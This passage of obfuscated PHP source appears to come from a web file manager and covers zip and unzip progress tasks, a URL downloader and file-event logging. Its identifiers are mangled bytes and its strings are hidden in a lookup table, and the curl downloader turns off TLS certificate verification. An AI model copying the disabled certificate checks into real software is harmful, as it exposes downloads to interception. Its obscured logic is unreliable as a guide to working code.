Cache::remove("\125\x73\145\162\117\x70\x74\x69\x6f\x6e\137{$b•õÙ÷ğâ·}\x5f" . $C“©”÷¿š‘); } protected function optionDefault($E˜ç‰Š¤‰Œ = '') { $bÔŠÎ Æù =& $_SERVER[¼€¼ˆ¦‚¡]; if ($E˜ç‰Š¤‰Œ == $bÔŠÎ Æù[33]) { return $GLOBALS[$bÔŠÎ Æù[6]][$bÔŠÎ Æù[2543]]; } if ($E˜ç‰Š¤‰Œ == $bÔŠÎ Æù[2544]) { return $GLOBALS[$bÔŠÎ Æù[6]][$bÔŠÎ Æù[2545]]; } } } goto f¶ò¶å¯ÒÒ; eˆç‚ùù‘“: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f·¹ƒÈ ¥­; AùÄÍÌ»‹: if (!$a°áİ‰Èå[$DËò†©×Ø±[1342]]) { $a°áİ‰Èå[$DËò†©×Ø±[1342]] = LNG($DËò†©×Ø±[1511]); } goto c¾è¤é°›; f·¹ƒÈ ¥­: $DËò†©×Ø± =& $_SERVER[¼€¼ˆ¦‚¡]; parent::startAfter(); Hook::bind($DËò†©×Ø±[1507], array($this, $DËò†©×Ø±[1508])); goto còà¯ÚÚ•; còà¯ÚÚ•: Hook::bind($DËò†©×Ø±[1034], array($this, $DËò†©×Ø±[1509])); $a°áİ‰Èå =& $this->task; $a°áİ‰Èå[$DËò†©×Ø±[1510]] = $DËò†©×Ø±[1039]; goto AùÄÍÌ»‹; c¾è¤é°›: } protected function endAfter() { $B‹ÏÍµå±» =& $_SERVER[¼€¼ˆ¦‚¡]; parent::endAfter(); Hook::unbind($B‹ÏÍµå±»[1507], array($this, $B‹ÏÍµå±»[1508])); Hook::unbind($B‹ÏÍµå±»[1034], array($this, $B‹ÏÍµå±»[1509])); } public function updateAfter() { $f˜õöí”Ø =& $_SERVER[¼€¼ˆ¦‚¡]; $CäÂè°Ì‚¸ =& $this->task; if (!$CäÂè°Ì‚¸[$f˜õöí”Ø[975]] || !$CäÂè°Ì‚¸[$f˜õöí”Ø[694]]) { return; } if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1510]] == $f˜õöí”Ø[1039]) { $C‡Ó‡¬¥ÉÙ = 0; if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1482]]) { $C‡Ó‡¬¥ÉÙ = $CäÂè°Ì‚¸[$f˜õöí”Ø[1483]] / $CäÂè°Ì‚¸[$f˜õöí”Ø[1482]]; } $CäÂè°Ì‚¸[$f˜õöí”Ø[1438]] = $C‡Ó‡¬¥ÉÙ * 0.3; } else { if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1510]] == $f˜õöí”Ø[301]) { $C‡Ó‡¬¥ÉÙ = $CäÂè°Ì‚¸[$f˜õöí”Ø[989]] / $CäÂè°Ì‚¸[$f˜õöí”Ø[975]]; $CäÂè°Ì‚¸[$f˜õöí”Ø[1438]] = 0.3 + $C‡Ó‡¬¥ÉÙ * 0.4; } else { if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1510]] == $f˜õöí”Ø[103]) { $fˆÒ‹‰Ì™× = 0; if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1484]] == $f˜õöí”Ø[103]) { $fˆÒ‹‰Ì™× = $CäÂè°Ì‚¸[$f˜õöí”Ø[1483]]; } $C‡Ó‡¬¥ÉÙ = ($CäÂè°Ì‚¸[$f˜õöí”Ø[1487]] + $fˆÒ‹‰Ì™×) / $CäÂè°Ì‚¸[$f˜õöí”Ø[694]]; $CäÂè°Ì‚¸[$f˜õöí”Ø[1438]] = 0.3 + 0.4 + $C‡Ó‡¬¥ÉÙ * 0.3; } } } if ($CäÂè°Ì‚¸[$f˜õöí”Ø[1438]] > 0) { $B“ÛäŒ˜ÓÏ = timeFloat() - $CäÂè°Ì‚¸[$f˜õöí”Ø[1440]] - $CäÂè°Ì‚¸[$f˜õöí”Ø[1443]]; $CäÂè°Ì‚¸[$f˜õöí”Ø[1444]] = $B“ÛäŒ˜ÓÏ * (1 - $CäÂè°Ì‚¸[$f˜õöí”Ø[1438]]) / $CäÂè°Ì‚¸[$f˜õöí”Ø[1438]]; } } public function addFile($Eêœ–ÂåÎ¾) { goto eÎ ¡Ø¼ñº; cæ¸“­êÌ½: $D…¥ƒ…Ò²[$e··çÕÌ¶ø[977]] = $e··çÕÌ¶ø[1499]; $D…¥ƒ…Ò²[$e··çÕÌ¶ø[1484]] = $e··çÕÌ¶ø[1039]; $D…¥ƒ…Ò²[$e··çÕÌ¶ø[694]] = $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[77]]; goto eÒËƒÓÍ¨; fË…ÙãˆÌÄ: $D…¥ƒ…Ò²[$e··çÕÌ¶ø[1480]] = $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[28]]; $D…¥ƒ…Ò²[$e··çÕÌ¶ø[1482]] = $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[77]]; $D…¥ƒ…Ò²[$e··çÕÌ¶ø[1483]] = 0; goto cæ¸“­êÌ½; e¢•‚¾½£ƒ: $this->update(); goto cåŒ£ÅÕÜò; eÒËƒÓÍ¨: $D…¥ƒ…Ò²[$e··çÕÌ¶ø[975]] = 1; $c¶±²«ÏÁ = 0; $D…¥ƒ…Ò²[$e··çÕÌ¶ø[1491]] = array($e··çÕÌ¶ø[1492] => $c¶±²«ÏÁ + 1, $e··çÕÌ¶ø[386] => $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[28]], $e··çÕÌ¶ø[75] => $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[75]], $e··çÕÌ¶ø[466] => $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[466]] ? $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[466]] : $aËóÏ×Ü¦Û[$e··çÕÌ¶ø[75]]); goto e¢•‚¾½£ƒ; eÎ ¡Ø¼ñº: $e··çÕÌ¶ø =& $_SERVER[¼€¼ˆ¦‚¡]; $D…¥ƒ…Ò² =& $this->task; $aËóÏ×Ü¦Û = IO::info($Eêœ–ÂåÎ¾); goto fË…ÙãˆÌÄ; cåŒ£ÅÕÜò: } public function unzipAfter($fõóö²µ«) { goto a²ËĞ¯’É; d‡±âÇ½Üù: $this->update(); self::log($FÛš¡Å™—ƒ[1512] . json_encode(array($F¸’æĞªã¸, $EÏ¿×§‚œ¤))); goto b…øçäß‚; EŸ†çê¸‡: if ($EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[29]] == $FÛš¡Å™—ƒ[167]) { $F¸’æĞªã¸[$FÛš¡Å™—ƒ[975]] = 1; } else { $F¸’æĞªã¸[$FÛš¡Å™—ƒ[975]] = $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[80]][$FÛš¡Å™—ƒ[78]]; } $F¸’æĞªã¸[$FÛš¡Å™—ƒ[977]] = $FÛš¡Å™—ƒ[33]; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1484]] = 0; goto aî–¸¸îÍñ; aî–¸¸îÍñ: $F¸’æĞªã¸[$FÛš¡Å™—ƒ[989]] = 0; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1482]] = 0; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1483]] = 0; goto e¥³÷Ï÷Ğğ; a²ËĞ¯’É: $FÛš¡Å™—ƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $F¸’æĞªã¸ =& $this->task; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1510]] = $FÛš¡Å™—ƒ[103]; goto EÊéŸÙ®ã±; EÊéŸÙ®ã±: $EÏ¿×§‚œ¤ = IO::infoWithChildren($fõóö²µ«); $A¶ éï¤²Ö = 0; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1491]] = array($FÛš¡Å™—ƒ[1492] => $A¶ éï¤²Ö + 1, $FÛš¡Å™—ƒ[386] => $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[28]], $FÛš¡Å™—ƒ[75] => $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[75]], $FÛš¡Å™—ƒ[466] => $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[466]] ? $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[466]] : $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[75]]); goto EŸ†çê¸‡; e¥³÷Ï÷Ğğ: $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1480]] = $FÛš¡Å™—ƒ[33]; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[1487]] = 0; $F¸’æĞªã¸[$FÛš¡Å™—ƒ[694]] = $EÏ¿×§‚œ¤[$FÛš¡Å™—ƒ[77]]; goto d‡±âÇ½Üù; b…øçäß‚: } public function nameParse($A“…¢º¦»ñ) { goto dÆ·‡¨…Á; dÆ·‡¨…Á: $BàÃò¹ÆÆˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $E»ˆñ°»ë =& $this->task; if ($E»ˆñ°»ë[$BàÃò¹ÆÆˆ[1510]] == $BàÃò¹ÆÆˆ[1039]) { $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[1510]] = $BàÃò¹ÆÆˆ[301]; $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[1487]] = 0; $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[694]] = 0; } goto AäŸ„õ±Ö¾; DïÛŞ‹àòø: $this->update(); goto AÌ”Ñ‹õô; AäŸ„õ±Ö¾: $eä²°ğŠ…³ = get_path_this($A“…¢º¦»ñ); if (strstr($eä²°ğŠ…³, $BàÃò¹ÆÆˆ[91])) { $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[989]] += 1; $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[975]] += 1; } $E»ˆñ°»ë[$BàÃò¹ÆÆˆ[1480]] = $A“…¢º¦»ñ; goto DïÛŞ‹àòø; AÌ”Ñ‹õô: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $cÇâÍ÷ïƒ¯ =& $_SERVER[¼€¼ˆ¦‚¡]; parent::startAfter(); Hook::bind($cÇâÍ÷ïƒ¯[1513], array($this, $cÇâÍ÷ïƒ¯[1508])); $FÃéÅã¿ÁÓ =& $this->task; $FÃéÅã¿ÁÓ[$cÇâÍ÷ïƒ¯[1510]] = $cÇâÍ÷ïƒ¯[1039]; if (!$FÃéÅã¿ÁÓ[$cÇâÍ÷ïƒ¯[1342]]) { $FÃéÅã¿ÁÓ[$cÇâÍ÷ïƒ¯[1342]] = LNG($cÇâÍ÷ïƒ¯[1514]); } } protected function endAfter() { $D‡¤Òæ‚¬ =& $_SERVER[¼€¼ˆ¦‚¡]; parent::endAfter(); Hook::unbind($D‡¤Òæ‚¬[1513], array($this, $D‡¤Òæ‚¬[1508])); } public function updateAfter() { $f•ÇâŞŒ”‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $BâÁ³µÈò =& $this->task; if (!$BâÁ³µÈò[$f•ÇâŞŒ”‰[975]] || !$BâÁ³µÈò[$f•ÇâŞŒ”‰[694]]) { return; } if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1510]] == $f•ÇâŞŒ”‰[1039]) { $D†¡Îôé· = $BâÁ³µÈò[$f•ÇâŞŒ”‰[1483]]; if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1484]] != $f•ÇâŞŒ”‰[1039]) { $D†¡Îôé· = 0; } $Eõ¨×âµÏ = ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1487]] + $D†¡Îôé·) / $BâÁ³µÈò[$f•ÇâŞŒ”‰[694]]; $BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]] = $Eõ¨×âµÏ * 0.3; } else { if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1510]] == $f•ÇâŞŒ”‰[301]) { $Eõ¨×âµÏ = $BâÁ³µÈò[$f•ÇâŞŒ”‰[989]] / $BâÁ³µÈò[$f•ÇâŞŒ”‰[975]]; $BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]] = 0.3 + $Eõ¨×âµÏ * 0.5; } else { if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1510]] == $f•ÇâŞŒ”‰[103]) { $Eõ¨×âµÏ = 0; if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1482]]) { $Eõ¨×âµÏ = $BâÁ³µÈò[$f•ÇâŞŒ”‰[1483]] / $BâÁ³µÈò[$f•ÇâŞŒ”‰[1482]]; } $BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]] = 0.3 + 0.5 + $Eõ¨×âµÏ * 0.2; } } } if ($BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]] > 0) { $e¡´¥íÏÌâ = timeFloat() - $BâÁ³µÈò[$f•ÇâŞŒ”‰[1440]] - $BâÁ³µÈò[$f•ÇâŞŒ”‰[1443]]; $BâÁ³µÈò[$f•ÇâŞŒ”‰[1444]] = $e¡´¥íÏÌâ * (1 - $BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]]) / $BâÁ³µÈò[$f•ÇâŞŒ”‰[1438]]; } } public function copyFileStart($b‰¾³ª›É, $C¾ÀİÍ®‚“, $fÔ²Š©Ó¦ƒ, $fâ‡œğÚõ, $Bòçï£Èß—, $BßËÂ“ÏàÔ) { $F›‹ºê›±¡ =& $_SERVER[¼€¼ˆ¦‚¡]; parent::copyFileStart($b‰¾³ª›É, $C¾ÀİÍ®‚“, $fÔ²Š©Ó¦ƒ, $fâ‡œğÚõ, $Bòçï£Èß—, $BßËÂ“ÏàÔ); $A·º‘Øá†‰ =& $this->task; if ($A·º‘Øá†‰[$F›‹ºê›±¡[1510]] == $F›‹ºê›±¡[301]) { $A·º‘Øá†‰[$F›‹ºê›±¡[1510]] = $F›‹ºê›±¡[103]; } $this->update(); } public function copyFileEnd($eµÊØ×ºØ, $c’¬†„¹Â†, $aô¡¬‡ì, $dùã»ïÏ, $eŒÜº’·‹, $E£ÒÏ“Œ’ø) { $eš»¤ëÏŸ =& $_SERVER[¼€¼ˆ¦‚¡]; $EÛù¢¡”À =& $this->task; $EÛù¢¡”À[$eš»¤ëÏŸ[1483]] = $EÛù¢¡”À[$eš»¤ëÏŸ[1482]]; $EÛù¢¡”À[$eš»¤ëÏŸ[1487]] += $EÛù¢¡”À[$eš»¤ëÏŸ[1482]]; $EÛù¢¡”À[$eš»¤ëÏŸ[1484]] = $eš»¤ëÏŸ[33]; $this->update(); } public function nameParse($f¥¡ˆ™ğ) { $BÚª×Ÿä„ =& $_SERVER[¼€¼ˆ¦‚¡]; $cù“·ÅçÅ =& $this->task; if ($cù“·ÅçÅ[$BÚª×Ÿä„[989]] < $cù“·ÅçÅ[$BÚª×Ÿä„[975]]) { $b¯ê¸Üæ¨ = get_path_this($f¥¡ˆ™ğ); if (strstr($b¯ê¸Üæ¨, $BÚª×Ÿä„[91])) { $cù“·ÅçÅ[$BÚª×Ÿä„[989]] += 1; } } if ($cù“·ÅçÅ[$BÚª×Ÿä„[1510]] == $BÚª×Ÿä„[1039]) { $cù“·ÅçÅ[$BÚª×Ÿä„[1510]] = $BÚª×Ÿä„[301]; } $cù“·ÅçÅ[$BÚª×Ÿä„[1480]] = $f¥¡ˆ™ğ; $this->update(); } } class Downloader { static function start($e§Î………ß, $Fš Â¨˜Ù, $cò«†áã‚ = 10) { goto e¤óé¢«‹Ÿ; e¤óé¢«‹Ÿ: $F§¨è¤ÏÃ† =& $_SERVER[¼€¼ˆ¦‚¡]; if (!request_url_safe($e§Î………ß)) { return array($F§¨è¤ÏÃ†[1031] => !1, $F§¨è¤ÏÃ†[1033] => $F§¨è¤ÏÃ†[1036]); } $DŒêàÒ‰˜ = $Fš Â¨˜Ù . $F§¨è¤ÏÃ†[1515]; goto F­ãÏ£Å; e£¨Óî¦Ü: if ($e¸ŞØ­øšÛ[$F§¨è¤ÏÃ†[1031]]) { @unlink($DŒêàÒ‰˜); } return $e¸ŞØ­øšÛ; goto eôØ‹ìš°ã; F­ãÏ£Å: $BçÔƒæ¼‰” = $Fš Â¨˜Ù . $F§¨è¤ÏÃ†[1516]; if (is_array($e§Î………ß)) { $fƒ§©öª‡ = $e§Î………ß; } else { $fƒ§©öª‡ = url_header($e§Î………ß); } $e§Î………ß = $fƒ§©öª‡[$F§¨è¤ÏÃ†[295]]; goto C¤¨à»ƒÈ†; C¤¨à»ƒÈ†: if (!$e§Î………ß) { return array($F§¨è¤ÏÃ†[1031] => !1, $F§¨è¤ÏÃ†[1033] => $F§¨è¤ÏÃ†[1036]); } if (!$fƒ§©öª‡[$F§¨è¤ÏÃ†[1288]] || $fƒ§©öª‡[$F§¨è¤ÏÃ†[325]] == 0) { @unlink($BçÔƒæ¼‰”); @unlink($Fš Â¨˜Ù); $e¸ŞØ­øšÛ = self::fileDownloadFopen($e§Î………ß, $Fš Â¨˜Ù, $fƒ§©öª‡[$F§¨è¤ÏÃ†[325]]); if ($e¸ŞØ­øšÛ[$F§¨è¤ÏÃ†[1031]]) { return $e¸ŞØ­øšÛ; } else { @unlink($BçÔƒæ¼‰”); @unlink($Fš Â¨˜Ù); $e¸ŞØ­øšÛ = self::fileDownloadCurl($e§Î………ß, $Fš Â¨˜Ù, !1, 0, $fƒ§©öª‡[$F§¨è¤ÏÃ†[325]]); @unlink($BçÔƒæ¼‰”); return $e¸ŞØ­øšÛ; } } $e‰ÅƒŸĞŠ³ = is_file($BçÔƒæ¼‰”) ? filesize($BçÔƒæ¼‰”) : 0; goto eµâèÜ¿²; EÑœŒ»İ„‘: if (is_file($DŒêàÒ‰˜)) { $b·é¶Ëî­ = file_get_contents($DŒêàÒ‰˜); $eÊ‹’ë¶ = json_decode($b·é¶Ëî­, 1); } if (file_exists($Fš Â¨˜Ù) && $d´šŠ—–Øê == filesize($Fš Â¨˜Ù)) { @unlink($BçÔƒæ¼‰”); @unlink($DŒêàÒ‰˜); return array($F§¨è¤ÏÃ†[1031] => !0, $F§¨è¤ÏÃ†[1033] => $F§¨è¤ÏÃ†[1518]); } if ($eÊ‹’ë¶[$F§¨è¤ÏÃ†[325]] != $d´šŠ—–Øê) { $eÊ‹’ë¶ = array($F§¨è¤ÏÃ†[325] => $d´šŠ—–Øê); } goto EŸîà“³ ; eµâèÜ¿²: $d´šŠ—–Øê = intval($fƒ§©öª‡[$F§¨è¤ÏÃ†[325]]); if (file_exists($BçÔƒæ¼‰”) && time() - filemtime($BçÔƒæ¼‰”) < 3) { return array($F§¨è¤ÏÃ†[1031] => !1, $F§¨è¤ÏÃ†[1033] => $F§¨è¤ÏÃ†[1517]); } $eÊ‹’ë¶ = array(); goto EÑœŒ»İ„‘; EŸîà“³ : if ($e‰ÅƒŸĞŠ³ > $d´šŠ—–Øê) { @unlink($BçÔƒæ¼‰”); } file_put_contents($DŒêàÒ‰˜, json_encode($eÊ‹’ë¶)); $e¸ŞØ­øšÛ = self::fileDownloadCurl($e§Î………ß, $Fš Â¨˜Ù, !0, $e‰ÅƒŸĞŠ³, $d´šŠ—–Øê); goto e£¨Óî¦Ü; eôØ‹ìš°ã: } static function fileDownloadFopen($E‘ÜĞØß„Š, $EŠİ§÷‡, $dÎñ¶¿»³ = 0) { $Fƒ§…§Ğ =& $_SERVER[¼€¼ˆ¦‚¡]; @ini_set($Fƒ§…§Ğ[1519], $Fƒ§…§Ğ[1520]); $a•ÈíÓíßŸ = $EŠİ§÷‡ . $Fƒ§…§Ğ[1516]; set_timeout(); @unlink($a•ÈíÓíßŸ); if ($cÜŒÃ×Áî  = @fopen($E‘ÜĞØß„Š, $Fƒ§…§Ğ[1521])) { goto dç§¯ ›š; B§¢æë‰ÓÍ: return array($Fƒ§…§Ğ[1031] => !0, $Fƒ§…§Ğ[1033] => $Fƒ§…§Ğ[692]); goto C»†´îğš¨; bÊğÁŞ†ƒ°: fclose($cÜŒÃ×Áî ); self::checkGzip($a•ÈíÓíßŸ); if (!@rename($a•ÈíÓíßŸ, $EŠİ§÷‡)) { usleep(round(rand(0, 1000) * 50)); @unlink($EŠİ§÷‡); $AÑ„é—‘Í‚ = @rename($a•ÈíÓíßŸ, $EŠİ§÷‡); if (!$AÑ„é—‘Í‚) { return array($Fƒ§…§Ğ[1031] => !1, $Fƒ§…§Ğ[1033] => $Fƒ§…§Ğ[1525]); } } goto B§¢æë‰ÓÍ; dç§¯ ›š: if (!($DÁé§ÙíÓè = @fopen($a•ÈíÓíßŸ, $Fƒ§…§Ğ[1522]))) { return array($Fƒ§…§Ğ[1031] => !1, $Fƒ§…§Ğ[1033] => $Fƒ§…§Ğ[1523]); } while (!feof($cÜŒÃ×Áî )) { if (!file_exists($a•ÈíÓíßŸ)) { fclose($DÁé§ÙíÓè); return array($Fƒ§…§Ğ[1031] => !1, $Fƒ§…§Ğ[1033] => $Fƒ§…§Ğ[1524]); } clearstatcache(); if ($dÎñ¶¿»³ > 0 && $dÎñ¶¿»³ == filesize(iconv_system($a•ÈíÓíßŸ))) { break; } fwrite($DÁé§ÙíÓè, fread($cÜŒÃ×Áî , 1024 * 8), 1024 * 8); } fclose($DÁé§ÙíÓè); goto bÊğÁŞ†ƒ°; C»†´îğš¨: } else { return array($Fƒ§…§Ğ[1031] => !1, $Fƒ§…§Ğ[1033] => $Fƒ§…§Ğ[1526]); } } static function fileDownloadCurl($A÷åùÙîìÂ, $CÁÛâ‡õ‰ö, $CÌóÒ¹™ = false, $eØ±ã’¸ÃŸ = 0, $F¹Õ—ŞÉà = 0) { goto B­¬“‚Úô; eÆŸà‘Ûï±: curl_close($E˜ ¤ñëô§); fclose($F¾åàè®¨‡); $CÔŸí¡¦§ = filesize(iconv_system($bÃàÏ»™)); goto BĞÁ™†¯³Á; Fïé˜©„œ: curl_setopt($E˜ ¤ñëô§, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($E˜ ¤ñëô§, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($E˜ ¤ñëô§, CURLOPT_SSL_VERIFYHOST, 0); goto fØêµ®œÕó; fØêµ®œÕó: curl_setopt($E˜ ¤ñëô§, CURLOPT_NOPROGRESS, !1); curl_setopt($E˜ ¤ñëô§, CURLOPT_PROGRESSFUNCTION, $B“Ûã®ÇÔ‚[1528]); curl_progress_start($E˜ ¤ñëô§); goto B‹İîìß¬; BĞÁ™†¯³Á: if ($CÔŸí¡¦§ < $F¹Õ—ŞÉà && $F¹Õ—ŞÉà != 0) { return array($B“Ûã®ÇÔ‚[1031] => !1, $B“Ûã®ÇÔ‚[1033] => $B“Ûã®ÇÔ‚[1517]); } if ($aéÁ•´‚¤š && filesize($bÃàÏ»™) != 0) { self::checkGzip($bÃàÏ»™); if (!@rename($bÃàÏ»™, $CÁÛâ‡õ‰ö)) { @unlink($CÁÛâ‡õ‰ö); $aéÁ•´‚¤š = @rename($bÃàÏ»™, $CÁÛâ‡õ‰ö); if (!$aéÁ•´‚¤š) { return array($B“Ûã®ÇÔ‚[1031] => !1, $B“Ûã®ÇÔ‚[1033] => $B“Ûã®ÇÔ‚[1529]); } } return array($B“Ûã®ÇÔ‚[1031] => !0, $B“Ûã®ÇÔ‚[1033] => $B“Ûã®ÇÔ‚[692]); } return array($B“Ûã®ÇÔ‚[1031] => !1, $B“Ûã®ÇÔ‚[1033] => $B“Ûã®ÇÔ‚[1530]); goto C¦öë…«Ä; ešì ©àŸÍ: $F¾åàè®¨‡ = @fopen($bÃàÏ»™, $B“Ûã®ÇÔ‚[979]); if (!$F¾åàè®¨‡) { return array($B“Ûã®ÇÔ‚[1031] => !1, $B“Ûã®ÇÔ‚[1033] => $B“Ûã®ÇÔ‚[1527]); } $E˜ ¤ñëô§ = curl_init($A÷åùÙîìÂ); goto D£õ‡Ç§ëˆ; D£õ‡Ç§ëˆ: if ($CÌóÒ¹™) { curl_setopt($E˜ ¤ñëô§, CURLOPT_RANGE, $eØ±ã’¸ÃŸ . $B“Ûã®ÇÔ‚[712]); } curl_setopt($E˜ ¤ñëô§, CURLOPT_FILE, $F¾åàè®¨‡); curl_setopt($E˜ ¤ñëô§, CURLOPT_REFERER, get_url_link($A÷åùÙîìÂ)); goto Fïé˜©„œ; B‹İîìß¬: curl_setopt($E˜ ¤ñëô§, CURLOPT_USERAGENT, $B“Ûã®ÇÔ‚[1520]); $aéÁ•´‚¤š = curl_exec($E˜ ¤ñëô§); curl_progress_end($E˜ ¤ñëô§); goto eÆŸà‘Ûï±; B­¬“‚Úô: $B“Ûã®ÇÔ‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÃàÏ»™ = $CÁÛâ‡õ‰ö . $B“Ûã®ÇÔ‚[1516]; set_timeout(); goto ešì ©àŸÍ; C¦öë…«Ä: } static function checkGzip($aĞ áäËñƒ) { goto f¬ñ¢Îï¨ä; BÈ…’ÆÌìÓ: file_put_contents($aĞ áäËñƒ, $bğ¶ „÷°¬); goto F¹ŠªáøÙÓ; Cí²õ«éÊ×: ob_start(); readgzfile($aĞ áäËñƒ); $bğ¶ „÷°¬ = ob_get_clean(); goto BÈ…’ÆÌìÓ; f¬ñ¢Îï¨ä: $A†š„¾…´· = $_SERVER[¼€¼ˆ¦‚¡][1531]; $BÉÁÙØî©Ò = file_sub_str($aĞ áäËñƒ, 0, 2); if ($A†š„¾…´· != $BÉÁÙØî©Ò) { return; } goto Cí²õ«éÊ×; F¹ŠªáøÙÓ: } } goto eÅ†Í•ŒîÓ; EƒğîÄ¡Æ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145\137\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\124\x69\x6d\x65", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\146\165\156\143\x74\151\x6f\x6e"), array("\x64\x65\x73\143", '', "\x69\x6e\163\145\x72\164\54\165\x70\144\141\164\145\x2c\163\145\x6c\x65\x63\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($B‘ùïƒê, $FÖÈÃœ¼ÊÌ, $a§’ÒÕÒÛ¿ = '') { goto cù‹áª±—; cù‹áª±—: $cØÖŠˆÏÙ› =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->eventSave) { return; } $E˜’‡È„…¡ = Model($cØÖŠˆÏÙ›[1117])->sourceInfo($B‘ùïƒê); goto f”ç£Æˆâã; f”ç£Æˆâã: if (!$E˜’‡È„…¡) { return !1; } if ($this->isCacheEvent($E˜’‡È„…¡, $FÖÈÃœ¼ÊÌ)) { return; } if ($a§’ÒÕÒÛ¿ && is_string($a§’ÒÕÒÛ¿)) { $a§’ÒÕÒÛ¿ = array($cØÖŠˆÏÙ›[2135] => $a§’ÒÕÒÛ¿); } goto e“äÆ‰ÂÌé; e“äÆ‰ÂÌé: $cÏÛÒÃğòº = array($cØÖŠˆÏÙ›[383] => $B‘ùïƒê, $cØÖŠˆÏÙ›[2283] => $E˜’‡È„…¡[$cØÖŠˆÏÙ›[461]], $cØÖŠˆÏÙ›[2284] => $E˜’‡È„…¡[$cØÖŠˆÏÙ›[28]], $cØÖŠˆÏÙ›[466] => $E˜’‡È„…¡[$cØÖŠˆÏÙ›[466]], $cØÖŠˆÏÙ›[1428] => USER_ID, $cØÖŠˆÏÙ›[388] => $FÖÈÃœ¼ÊÌ, $cØÖŠˆÏÙ›[1430] => $a§’ÒÕÒÛ¿); $this->addSystemLog($FÖÈÃœ¼ÊÌ, $cÏÛÒÃğòº); return $this->add($cÏÛÒÃğòº); goto CŒ¤ ì“²—; CŒ¤ ì“²—: } private function addSystemLog($eŠ—° ¡¶¯, $c§ö–ÌŞì˜) { $DĞñÎÃÄ•¯ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($eŠ—° ¡¶¯ == $DĞñÎÃÄ•¯[2285]) { $eŠ—° ¡¶¯ = $c§ö–ÌŞì˜[$DĞñÎÃÄ•¯[405]][$DĞñÎÃÄ•¯[2286]]; } else { if (in_array($eŠ—° ¡¶¯, array($DĞñÎÃÄ•¯[2082], $DĞñÎÃÄ•¯[2287]))) { $eŠ—° ¡¶¯ = $c§ö–ÌŞì˜[$DĞñÎÃÄ•¯[405]][$DĞñÎÃÄ•¯[688]]; } } $a’Ë…™Óø‹ = array_merge($c§ö–ÌŞì˜, array($DĞñÎÃÄ•¯[2288] => $c§ö–ÌŞì˜[$DĞñÎÃÄ•¯[369]], $DĞñÎÃÄ•¯[2289] => $c§ö–ÌŞì˜[$DĞñÎÃÄ•¯[2289]])); Model($DĞñÎÃÄ•¯[2045])->addLog($DĞñÎÃÄ•¯[2290] . $eŠ—° ¡¶¯, $a’Ë…™Óø‹); } private function isCacheEvent($fĞÒ‰†”—á, $FÄàÃè¬õ¶) { if ($fĞÒ‰†”—á[$_SERVER[¼€¼ˆ¦‚¡][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($FÈñæ—¿ä©, $dØˆã×½À) { $Fã•È÷ßÙİ =& $_SERVER[¼€¼ˆ¦‚¡]; $bØš°â„œß = Model($Fã•È÷ßÙİ[1117])->sourceInfo($FÈñæ—¿ä©); $cÊ¾–‘ºİ = array($Fã•È÷ßÙİ[2286] => $dØˆã×½À, $Fã•È÷ßÙİ[28] => $bØš°â„œß[$Fã•È÷ßÙİ[28]]); return $this->addEvent($FÈñæ—¿ä©, $Fã•È÷ßÙİ[2285], $cÊ¾–‘ºİ); } public function eventFileEdit($B°Á¯‘±íâ) { $a¼š†·…Îã =& $_SERVER[¼€¼ˆ¦‚¡]; $eÛ‹Úö¿ = array($a¼š†·…Îã[2291] => $_SERVER[$a¼š†·…Îã[2292]], $a¼š†·…Îã[1751] => strtolower(ACTION)); return $this->addEvent($B°Á¯‘±íâ, 